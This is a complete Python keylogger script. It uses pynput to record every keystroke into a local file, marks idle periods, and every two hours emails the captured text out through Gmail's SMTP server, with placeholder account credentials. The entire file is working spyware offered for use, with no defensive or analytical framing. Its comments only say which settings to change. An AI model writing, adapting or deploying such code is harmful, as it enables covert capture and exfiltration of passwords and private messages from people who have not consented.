# Import libs
from pynput.keyboard import Listener
from threading import Timer
import smtplib as smtp
import time

msg=''

# Key detection function
def press_key(key):
    global msg
    try:
        msg+=str(key.char)
    except:
        if str(key)=='Key.enter':
            msg+='\n'
            logger(msg)
        elif str(key)=='Key.backspace':
            msg=msg[:-1]
        elif str(key)=='Key.space':
            msg+=' '
        elif str(key)=='Key.shift' or str(key)=='Key.shift_r':
            pass
        else:
            msg+=' ['+str(key)+'] '

# Initialize log file, change log file name if needed
def logger(message):
    with open('key_record.txt','w') as text_file:
        text_file.write(message)

# Idle check function, update idle time as needed (300 seconds = 5 minutes)
def idle_checker(old_msg_len):
    global msg
    if old_msg_len==len(msg):
        msg+='\nno activity during the last 5 minutes\n'
        logger(msg)
    old_msg_len=len(msg)
    Timer(300.0,idle_checker,args=[old_msg_len]).start()

# Email send function, update email account and sending frequency as needed (7200 seconds = 2 hours)
def email_send(message):
    message+='\n\nReport sent on: '+time.ctime()
    logger(message)
    with smtp.SMTP('smtp.gmail.com',587) as smtp_server:
        smtp_server.ehlo()
        smtp_server.starttls()
        smtp_server.login('youremail@gmail.com','Password123')
        smtp_server.sendmail('youremail@gmail.com','youremail@gmail.com',message.encode(encoding='UTF-8'))
        smtp_server.quit()
    Timer(7200.0,email_send,args=[msg]).start()

# Run process in the background
Timer(1.0,idle_checker,args=[0]).start()
Timer(1.0,email_send,args=[msg]).start()

with Listener(on_press=press_key) as listener:
    listener.join()
